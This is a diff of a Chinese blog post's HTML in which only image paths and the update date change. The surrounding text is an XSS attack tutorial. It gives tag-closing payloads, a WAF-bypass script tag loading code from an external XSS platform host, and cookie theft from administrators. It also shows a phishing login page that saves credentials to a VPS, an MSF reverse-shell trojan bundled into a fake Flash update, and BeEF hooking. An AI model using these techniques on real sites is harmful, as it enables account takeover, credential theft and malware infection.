@@ -302,7 +302,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-arrows-rotate"></i>&nbsp;
-                    <span class="datetime" data-updated="Sat Dec 14 2024 22:16:25 GMT+0800">2024-12-14 22:16:25</span>
+                    <span class="datetime" data-updated="Sun Dec 15 2024 18:36:31 GMT+0800">2024-12-15 18:36:31</span>
                 </span>
             
         
@@ -355,26 +355,26 @@ cookie盗取 欺骗管理员身份登录后台<br>
 <p>根目录/首页 head头标签里面的script代码</p>
 </blockquote>
 <h2 id="跨站脚本的实例"><a class="markdownIt-Anchor" href="#跨站脚本的实例"></a> 跨站脚本的实例：</h2>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163031762.png"></p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163329648.png"></p>
+<p><img lazyload alt="image" data-src="image-20241208163031762.png"></p>
+<p><img lazyload alt="image" data-src="image-20241208163329648.png"></p>
 <h2 id="xss分类"><a class="markdownIt-Anchor" href="#xss分类"></a> XSS分类</h2>
 <h3 id="反射型xss"><a class="markdownIt-Anchor" href="#反射型xss"></a> 反射型XSS</h3>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163557667.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163608112.png"></p>
+<p><img lazyload alt="image" data-src="image-20241208163557667.png"><br>
+<img lazyload alt="image" data-src="image-20241208163608112.png"></p>
 <h3 id="存储型xss"><a class="markdownIt-Anchor" href="#存储型xss"></a> 存储型XSS</h3>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163824605.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163946828.png"></p>
+<p><img lazyload alt="image" data-src="image-20241208163824605.png"><br>
+<img lazyload alt="image" data-src="image-20241208163946828.png"></p>
 <h3 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss"></a> DOM型XSS</h3>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208164017118.png"></p>
+<p><img lazyload alt="image" data-src="image-20241208164017118.png"></p>
 <h2 id="xss漏洞挖掘"><a class="markdownIt-Anchor" href="#xss漏洞挖掘"></a> XSS漏洞挖掘</h2>
 <h3 id="手工挖掘xss"><a class="markdownIt-Anchor" href="#手工挖掘xss"></a> 手工挖掘XSS</h3>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208164147069.png"></p>
+<p><img lazyload alt="image" data-src="image-20241208164147069.png"></p>
 <ol>
 <li>
 <p>闭合</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>123<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">#插入的内容：123<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>123<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">这么一来就把前面的标签闭合了</span><br></pre></td></tr></table></figure>
 <p>比如说我们找到了一个可以注入的地方，可以先看一眼前端代码来确定一下他的闭合方式，然后来绕过</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211215821462.png"></p>
+<p><img lazyload alt="image" data-src="image-20241211215821462.png"></p>
 </li>
 <li>
 <p>长度限制</p>
@@ -405,10 +405,10 @@ cookie盗取 欺骗管理员身份登录后台<br>
 <li>
 <p>waf防护（d盾、360、云锁）</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/src=//xssye.com/sluJ&gt; <span class="comment">&lt;!-- 这种可以过云锁 --&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211215435452.png"></p>
+<p><img lazyload alt="image" data-src="image-20241211215435452.png"></p>
 <p>像这种，使用了 img 标签，然后 src 指定一个 x，这样一定会报错，一旦报错就会执行后面的 eval 命令（这里过滤了script）</p>
 <p>里面的 atob 使用来解码 base64 的</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211215725449.png"></p>
+<p><img lazyload alt="image" data-src="image-20241211215725449.png"></p>
 </li>
 </ol>
 </li>
@@ -442,24 +442,24 @@ cookie盗取 欺骗管理员身份登录后台<br>
 </li>
 </ol>
 <h3 id="xss-的编码"><a class="markdownIt-Anchor" href="#xss-的编码"></a> XSS 的编码</h3>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211222507390.png"></p>
+<p><img lazyload alt="image" data-src="image-20241211222507390.png"></p>
 <h4 id="html实体编码"><a class="markdownIt-Anchor" href="#html实体编码"></a> html实体编码</h4>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213211917409.png"></p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221416412.png"></p>
+<p><img lazyload alt="image" data-src="image-20241213211917409.png"></p>
+<p><img lazyload alt="image" data-src="image-20241211221416412.png"></p>
 <p>将上述代码进行编码（HTML转义）：</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221456461.png"></p>
+<p><img lazyload alt="image" data-src="image-20241211221456461.png"></p>
 <p>我们将转义之后的编码直接写到 html 文件里面运行，查看运行结果</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221548071.png"></p>
+<p><img lazyload alt="image" data-src="image-20241211221548071.png"></p>
 <p>可以看到直接被解码然后输出出来了，并没有被运行（解一次码，然后当做字符串输出），那我们应该怎么写？<br>
 可以单纯将内容进行编码，不对标签进行编码</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221754286.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221825165.png"></p>
+<p><img lazyload alt="image" data-src="image-20241211221754286.png"><br>
+<img lazyload alt="image" data-src="image-20241211221825165.png"></p>
 <p>再次访问发现图片可以被显示出来了（所以不可以把整条语句都进行编码，只编码值就可以）</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221902097.png"></p>
+<p><img lazyload alt="image" data-src="image-20241211221902097.png"></p>
 <p>那我们再进行一下测试，这次我们把 src=也进行编码，看看结果如何</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211222049416.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211222112526.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211222150482.png"></p>
+<p><img lazyload alt="image" data-src="image-20241211222049416.png"><br>
+<img lazyload alt="image" data-src="image-20241211222112526.png"><br>
+<img lazyload alt="image" data-src="image-20241211222150482.png"></p>
 <blockquote>
 <p>所以我们要对这种进行html实体编码同时要可以运行：</p>
 <ul>
@@ -468,12 +468,12 @@ cookie盗取 欺骗管理员身份登录后台<br>
 </ul>
 </blockquote>
 <h4 id="进制类编码"><a class="markdownIt-Anchor" href="#进制类编码"></a> 进制类编码</h4>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213212031252.png"></p>
+<p><img lazyload alt="image" data-src="image-20241213212031252.png"></p>
 <blockquote>
 <p>对需要执行的代码进行编码，其他的地方不要乱编码</p>
 </blockquote>
 <h4 id="unicode-编码"><a class="markdownIt-Anchor" href="#unicode-编码"></a> Unicode 编码</h4>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213212206883.png"></p>
+<p><img lazyload alt="image" data-src="image-20241213212206883.png"></p>
 <blockquote>
 <p>在反射型 URL 当中可以尝试 Unicode 编码</p>
 <p>JS 代码加密：如果 WAF 拦截代码的话</p>
@@ -487,20 +487,20 @@ cookie盗取 欺骗管理员身份登录后台<br>
 <p>可以使用盗取到的cookie直接登录到目标网站</p>
 <h3 id="存储型xss盗取cookie"><a class="markdownIt-Anchor" href="#存储型xss盗取cookie"></a> 存储型XSS盗取cookie</h3>
 <p>我们先找到一个可以上传的地方，同时上传的最终地点是数据库，比如留言板，然后在留言的位置直接插入XSS代码，但是要注意尝试闭合，比如留言的位置就可以使用  标签进行闭合，然后其他位置可以查看前端代码来猜测应该使用什么标签进行闭合，然后那种有长度限制的，比如这里的QQ还有邮箱，我们就可以尝试直接抓包来修改长度限制。</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213221207406.png"></p>
+<p><img lazyload alt="image" data-src="image-20241213221207406.png"></p>
 <p>然后我们进入到管理员后台进行查看</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213221702476.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213221745229.png"></p>
+<p><img lazyload alt="image" data-src="image-20241213221702476.png"><br>
+<img lazyload alt="image" data-src="image-20241213221745229.png"></p>
 <p>标签闭合成功，代码成功执行，然后我们返回到一个 XSS 平台进行查看</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213221847650.png"></p>
+<p><img lazyload alt="image" data-src="image-20241213221847650.png"></p>
 <p>可以看到返回了一个管理后台的地址以及管理员cookie，这个时候我们就可以尝试 cookie 注入了，进入到管理员的后台管理系统，使用刚刚劫持到的cookie直接伪造成管理员的身份进行登录，绕过登录【其中这个的管理员地址以及cookie的传播过程会被捕捉到，可以直接在网络里面进行查看】</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213222123472.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213222421994.png"></p>
+<p><img lazyload alt="image" data-src="image-20241213222123472.png"><br>
+<img lazyload alt="image" data-src="image-20241213222421994.png"></p>
 <h3 id="反射型xss盗取cookie"><a class="markdownIt-Anchor" href="#反射型xss盗取cookie"></a> 反射型XSS盗取cookie</h3>
 <p>将 XSS 代码插入到 URL 当中，只要诱导管理员点击这个 URL 就可以拿到管理员的 cookie</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213222624728.png"></p>
+<p><img lazyload alt="image" data-src="image-20241213222624728.png"></p>
 <p>但是这种 URL 一眼就可以看出来是带有XSS的，所以我们需要伪造一下，比如：发送一个页面，就类似下面这种：上面的页面输入正常页面，然后插入一张图片对应的 SRC 是一个反射型 URL，然后我们将这个 HTML 页面使用邮箱发送给受害者，一旦受害者打开这个 HTML 页面，我们就可以在XSS平台接收到他的 cookie</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214163720027.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214163720027.png"></p>
 <blockquote>
 <p><strong>建立session会话控制：</strong></p>
 <p>cookie 是有有效期的，一般是7天或者是1个月，如果管理员修改了密码，那么cookie就会失效，我们可以设置一个短信提醒，提前进入到管理员后台，将 cookie 换为 session，这样就算 cookie 被修改了也可以维持登录状态</p>
@@ -513,13 +513,13 @@ awvs：如果没有启用就会报一个中危漏洞<br>
 一旦被启用的话，就只能打到管理员后台（会返回一个地址），返回的cookie没有用或者返回为空（打不到cookie）</p>
 </blockquote>
 <h3 id="http-only-启用时的攻击"><a class="markdownIt-Anchor" href="#http-only-启用时的攻击"></a> http-only 启用时的攻击</h3>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214193422491.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214193422491.png"></p>
 <blockquote>
 <p>启用了 http-only，我们无法获取cookie</p>
 <ol>
 <li>
 <p>钓鱼（ <strong>通过伪造管理员后台盗取管理员账号</strong> ）</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214193634201.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214193634201.png"></p>
 <p>我们使用客户端浏览器将代码植入到目标网站的后台里面，管理员登录到后台之后触发代码就会弹出一个登录界面，这个界面就是我们使用VPS搭建的一个钓鱼页面，管理员一旦登录，我们就可以获取到他的账号以及密码，然后这些信息会保存到我们VPS的数据库当中</p>
 <p>这里介绍一个工具 <strong>httrack</strong>，这个工具可以用来下载网站上的一些源码（通过网站的 URL 来下载），使用这个是为了防止不同操作系统之间的编码问题导致的乱码问题（这个工具可以直接在 kali 上使用）</p>
 <p>【钓鱼实例】</p>
@@ -529,81 +529,81 @@ awvs：如果没有启用就会报一个中危漏洞<br>
 </li>
 <li>
 <p>将下载好的源码放到小皮的根目录下，之后我们需要修改一些参数，比如跳转的地址以及数据库的name</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214202122104.png"></p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214202146419.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214202122104.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214202146419.png"></p>
 </li>
 <li>
 <p>然后我们还需要两个php文件，一个是<code>index.php</code>，一个是<code>tz.php</code>文件</p>
 <p><code>index.php</code> 文件：</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214201419310.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214201419310.png"></p>
 <p>这个文件的主要内容就是他会接收两个参数，一个 username 和一个 password，同时会将这两个参数保存到一个admin表里面，这个表有两列，一个是 username列，一个是 password列，然后开头是一个连接数据库的命令，就是本地的数据库（如果有 VPS 就修改成 VPS 的地址），然后是数据库的账密以及指定的数据库 dd。总结就是会将接收到的账密发送到指定的数据库当中。注意开头还 include了一个 <code>tz.php</code></p>
 <p><code>tz.php</code> 文件：</p>
 <p>用来让管理员跳转到真正的后台地址的</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214202246828.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214202246828.png"></p>
 </li>
 <li>
 <p>然后就是最重要的一步，我们怎么才可以将这个钓鱼页面上传到目标的后台，这个时候就可以利用存储型XSS</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214203517403.png"></p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214203611244.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214203517403.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214203611244.png"></p>
 </li>
 <li>
 <p>然后我们切换到管理员视角，我们先进入到管理员后台</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214203721856.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214203721856.png"></p>
 <p>一点击这个等审留言就会跳转到钓鱼页面</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214203816700.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214203816700.png"></p>
 <p>然后管理员就会进行登录，这个时候账密就会被传输到 VPS 的数据库上面，然后页面再次跳转，跳转到管理后台登录的首页，但是管理员只会认为需要重复登录，然后登录成功就会进入到后台页面</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214204044558.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214204044558.png"></p>
 <p>然后我们查看一下VPS的数据库，可以看到账密已经被记录下来了</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214204133386.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214204133386.png"></p>
 </li>
 <li>
 <p>当然我们也可以直接使用 XSS 平台来实现这种效果，就是将最后那个Windows跳转的代码写入到一个模块里面，然后创建一个项目引用这个模块</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214204726774.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214204726774.png"></p>
 </li>
 <li>
 <p>钓鱼（合成flash -更新升级exe程序来获取管理员pc权限）【难点：免杀以及伪造】</p>
 <p>思路：下载一个flash升级页面</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214205250985.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214205250985.png"></p>
 <p>伪造一个flash的升级页面，想办法让他跳转到这个页面下载flash，然后我们将正常的flash软件和我们的木马进行捆绑，只要他下载升级了，我们的木马就会运行（给木马做一个免杀）</p>
 <ol>
 <li>
 <p>首先我们需要使用 MSF 生成一个反弹 shell 的 exe 可执行文件（木马 =&gt; 记得给木马做一个免杀）</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214205707291.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214205707291.png"></p>
 </li>
 <li>
 <p>开启监听</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214205925848.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214210000339.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214205925848.png"><br>
+<img lazyload alt="image" data-src="image-20241214210000339.png"></p>
 </li>
 <li>
 <p>使用 <strong>httrack</strong> 下载 flash 的页面，方便后序进行钓鱼</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214210309971.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214210309971.png"></p>
 <p>其他的都做的一模一样了，唯一需要修改的就是这些参数还有这个立即下载的样式，这个就是前端的东西了，还有就是点击下载之后会跳出一个flash.exe文件的下载，这个我们也要根据原版的样式进行模拟，然后我们可以注册一个 <strong>flash.top</strong> 这种类似的域名，和我们的 VPS 绑定一下，还有就是要修改一下网站的 icon</p>
 </li>
 <li>
 <p>然后就是将 flash的那个软件和我们的木马进行捆绑</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214210920334.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214210920334.png"></p>
 <p>我们只需要创建一个自解压格式的压缩文件，然后修改一下压缩文件的名称就可以，他会自动生成exe类型的文件</p>
 <p>然后我们还需要修改一下他的设置</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211043171.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211101513.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211135113.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211221383.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214211043171.png"><br>
+<img lazyload alt="image" data-src="image-20241214211101513.png"><br>
+<img lazyload alt="image" data-src="image-20241214211135113.png"><br>
+<img lazyload alt="image" data-src="image-20241214211221383.png"></p>
 <p>最后我们只需要修改一下这个新生成的文件的图标就可以</p>
 </li>
 <li>
 <p>然后就是钓鱼用的XSS代码，我们只需要将最后的地址修改为我们VPS的地址就可以</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211344725.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214211344725.png"></p>
 <p>使用上述的代码在XSS平台创建一个模块，然后利用这个模块创建一个项目，之后利用生成的XSS代码进行钓鱼</p>
 </li>
 <li>
 <p>我们将上面生成的XSS代码插入到留言板里面，当管理员访问后台的时候就会跳转</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211721398.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214211721398.png"></p>
 <p>然后我们点击立即下载，可以看到下载成功了</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211808132.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214211808132.png"></p>
 <p>然后我们点击运行，可以看到 flash 的软件以及木马都被执行了，后台的会话也成功建立了</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211858199.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211913732.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214211858199.png"><br>
+<img lazyload alt="image" data-src="image-20241214211913732.png"></p>
 </li>
 </ol>
 </li>
@@ -613,17 +613,17 @@ awvs：如果没有启用就会报一个中危漏洞<br>
 </blockquote>
 <h3 id="beef-xss"><a class="markdownIt-Anchor" href="#beef-xss"></a> beef-XSS</h3>
 <p>参考文章：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53517370/article/details/128992559">beef-xss详细教程<i class="fas fa-external-link-alt"></i></a></p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214214016350.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214214016350.png"></p>
 <p>我们需要利用上述的XSS代码进行测试，将他放到留言板插入到数据库当中</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214214150203.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214214241669.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214214150203.png"><br>
+<img lazyload alt="image" data-src="image-20241214214241669.png"></p>
 <p>进入到管理页面可以看到XSS已经被执行了，然后我们去管理面板看看有没有上线，可以看到已经成功上线了，然后就可以进行一系列操作了，比如：可以获取到管理后台的表单、管理员的cookie、超链接等等</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214214324858.png"><br>
-<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214214545096.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214214324858.png"><br>
+<img lazyload alt="image" data-src="image-20241214214545096.png"></p>
 <blockquote>
 <p>这个时候问题来了，这个 beef-xss 只能在我们本地 kali 运行起来，所以利用的地址也是我们本地的，那要怎么拿去钓鱼呢？<strong>可以使用 ngrock 进行代理转发</strong></p>
 <p>我们只需要修改一下beef的配置文件，将端口修改为 ngrock 转发到本地的端口，然后我们就可以利用 ngrock 给的公网的地址进行钓鱼了</p>
-<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214215100865.png"></p>
+<p><img lazyload alt="image" data-src="image-20241214215100865.png"></p>
 </blockquote>
 <h3 id="xss平台的搭建"><a class="markdownIt-Anchor" href="#xss平台的搭建"></a> XSS平台的搭建</h3>
 <p>参考文章：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_64551911/article/details/124584804">手把手教你搭建XSS平台_xss平台搭建-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
